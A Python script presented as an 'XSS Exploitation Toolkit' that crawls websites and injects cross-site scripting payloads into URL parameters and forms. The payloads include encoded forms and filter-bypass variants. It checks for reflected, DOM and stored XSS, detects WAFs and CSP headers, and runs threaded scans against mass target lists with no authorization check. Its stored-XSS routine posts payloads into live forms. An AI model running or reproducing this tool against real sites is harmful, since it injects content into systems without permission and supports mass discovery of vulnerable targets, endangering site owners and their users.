import requests
import threading
import random
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
import re
import os
import base64

# Initialize colorama
init(autoreset=True)

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"
]

xss_payloads = [
    "<script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<script>confirm`XSS`</script>",
    "<img src=x onerror=prompt(1)>",
    "<body onload=alert('XSS')>"
]

encoded_payloads = []
for payload in xss_payloads:
    encoded_payloads.append(payload.encode('utf-8').hex())
    encoded_payloads.append(''.join(['%{:02x}'.format(b) for b in payload.encode()]))
    encoded_payloads.append(base64.b64encode(payload.encode()).decode())

def print_banner():
    print(Fore.RED + r'''
   _____  ____   ____   
  / ____||  _ \ / __ \  
 | (___  | |_) | |  | | 
  \___ \ |  _ <| |  | | 
  ____) || |_) | |__| | 
 |_____/ |____/ \____/  
''' + Fore.YELLOW + " XSS Exploitation Toolkit by Sean\n" + Style.RESET_ALL)

def log_result(message):
    with open("xss_scan_results.txt", "a") as f:
        f.write(message + "\n")

def extract_parameters(url):
    params = set()
    try:
        r = requests.get(url, timeout=10)
        soup = BeautifulSoup(r.text, 'html.parser')

        for form in soup.find_all('form'):
            for inp in form.find_all('input'):
                name = inp.get('name')
                if name:
                    params.add(name)

        query_params = parse_qs(urlparse(url).query)
        for param in query_params:
            params.add(param)

    except:
        pass
    return list(params)

def detect_reflected_xss(url):
    found = False
    params = extract_parameters(url)
    for payload in xss_payloads + encoded_payloads:
        for param in params:
            try:
                r = requests.get(url, params={param: payload}, headers={"User-Agent": random.choice(user_agents)}, timeout=10)
                if payload in r.text:
                    print(Fore.GREEN + f"[+] Reflected XSS Detected: {url} ? {param} = {payload}")
                    log_result(f"[+] Reflected XSS Detected: {url} ? {param} = {payload}")
                    found = True
            except:
                continue
    if not found:
        print(Fore.RED + f"[-] No Reflected XSS Found on: {url}")

def detect_post_xss(url):
    found = False
    try:
        r = requests.get(url, timeout=10)
        soup = BeautifulSoup(r.text, 'html.parser')
        forms = soup.find_all('form')
        for form in forms:
            action = form.get('action') or url
            method = form.get('method', 'get').lower()
            inputs = form.find_all('input')
            for payload in xss_payloads:
                data = {inp.get('name'): payload for inp in inputs if inp.get('name')}
                target_url = urljoin(url, action)
                try:
                    res = requests.post(target_url, data=data, timeout=10) if method == 'post' else requests.get(target_url, params=data, timeout=10)
                    if payload in res.text:
                        print(Fore.GREEN + f"[+] POST XSS Detected in form: {target_url} with payload: {payload}")
                        log_result(f"[+] POST XSS Detected in form: {target_url} with payload: {payload}")
                        found = True
                except:
                    continue
    except:
        pass
    if not found:
        print(Fore.RED + f"[-] No POST XSS Found on: {url}")

def detect_dom_xss(url):
    try:
        r = requests.get(url, timeout=10)
        if re.search(r'document\.location|location\.hash|document\.URL|document\.referrer', r.text):
            print(Fore.GREEN + f"[!] Potential DOM XSS Detected: {url}")
            log_result(f"[!] Potential DOM XSS Detected: {url}")
        else:
            print(Fore.RED + f"[-] No DOM XSS Found on: {url}")
    except:
        pass

def detect_waf(url):
    try:
        r = requests.get(url, headers={"User-Agent": random.choice(user_agents)}, timeout=10)
        wafs = ["cloudflare", "sucuri", "akamai", "imperva"]
        for waf in wafs:
            if waf in r.text.lower():
                print(Fore.YELLOW + f"[!] WAF Detected ({waf}): {url}")
                log_result(f"[!] WAF Detected ({waf}): {url}")
    except:
        pass

def xss_filter_bypass_check(url):
    tricks = [
        "<sCript>alert(1)</sCript>",
        "<scr<script>ipt>alert(1)</script>",
        "<script/src=data:,alert(1)>"
    ]
    found = False
    for trick in tricks:
        try:
            r = requests.get(url, params={"q": trick}, timeout=10)
            if trick in r.text:
                print(Fore.GREEN + f"[+] Filter Bypass XSS Detected at {url} with payload: {trick}")
                log_result(f"[+] Filter Bypass XSS Detected at {url} with payload: {trick}")
                found = True
        except:
            pass
    if not found:
        print(Fore.RED + f"[-] No Filter Bypass XSS Found on: {url}")

def stored_xss_check(url):
    print(Fore.YELLOW + f"[*] Checking Stored XSS on: {url}")
    found = False
    try:
        r = requests.get(url, timeout=10)
        soup = BeautifulSoup(r.text, 'html.parser')
        forms = soup.find_all('form')
        for form in forms:
            action = form.get('action') or url
            method = form.get('method', 'get').lower()
            inputs = form.find_all('input')
            for payload in xss_payloads:
                data = {inp.get('name'): payload for inp in inputs if inp.get('name')}
                target_url = urljoin(url, action)
                try:
                    requests.post(target_url, data=data, timeout=10) if method == 'post' else requests.get(target_url, params=data, timeout=10)
                except:
                    continue
        res = requests.get(url, timeout=10)
        for payload in xss_payloads:
            if payload in res.text:
                print(Fore.GREEN + f"[+] Stored XSS Detected at {url} with payload: {payload}")
                log_result(f"[+] Stored XSS Detected at {url} with payload: {payload}")
                found = True
    except:
        pass
    if not found:
        print(Fore.RED + f"[-] No Stored XSS Found on: {url}")

def detect_csp(url):
    try:
        r = requests.get(url, timeout=10)
        csp = r.headers.get("Content-Security-Policy")
        if csp:
            print(Fore.LIGHTRED_EX + f"[!] CSP Detected on {url}: {csp}")
            log_result(f"[!] CSP Detected on {url}: {csp}")
    except:
        pass

def crawl_site(url):
    visited = set()
    to_visit = [url]
    all_urls = []

    while to_visit:
        current = to_visit.pop()
        if current in visited or not current.startswith(url):
            continue
        visited.add(current)
        all_urls.append(current)
        try:
            r = requests.get(current, timeout=10)
            soup = BeautifulSoup(r.text, 'html.parser')
            for link in soup.find_all('a', href=True):
                full_url = urljoin(current, link['href'])
                to_visit.append(full_url)
        except:
            continue
    return all_urls

def scan_target(url):
    detect_waf(url)
    detect_csp(url)
    detect_reflected_xss(url)
    detect_post_xss(url)
    detect_dom_xss(url)
    stored_xss_check(url)
    xss_filter_bypass_check(url)

def scan_single_target():
    url = input("Enter target URL: ").strip()
    if not url.startswith("http"):
        print(Fore.RED + "[!] Invalid URL format.")
        return
    print(Fore.YELLOW + "[*] Crawling and scanning...")
    targets = [url] + crawl_site(url)
    for target in targets:
        scan_target(target)

def scan_mass_targets():
    path = input("Enter path to targets list: ")
    threads = []
    try:
        with open(path) as f:
            raw_targets = [line.strip() for line in f if line.strip()]
    except:
        print("[!] File not found.")
        return

    try:
        count = int(input("Enter number of threads: "))
    except:
        print("[!] Invalid thread count.")
        return

    def worker(target):
        targets = [target] + crawl_site(target)
        for url in targets:
            scan_target(url)

    for target in raw_targets:
        t = threading.Thread(target=worker, args=(target,))
        t.start()
        threads.append(t)
        if len(threads) >= count:
            for t in threads:
                t.join()
            threads = []
    for t in threads:
        t.join()

def main():
    print_banner()
    if os.path.exists("xss_scan_results.txt"):
        os.remove("xss_scan_results.txt")
    while True:
        print("\n[1] Scan Single Target")
        print("[2] Scan Mass Targets")
        print("[3] Exit")
        choice = input("Select an option: ")

        if choice == '1':
            scan_single_target()
        elif choice == '2':
            scan_mass_targets()
        elif choice == '3':
            print("Goodbye!")
            break
        else:
            print("[!] Invalid option")

if __name__ == "__main__":
    main()
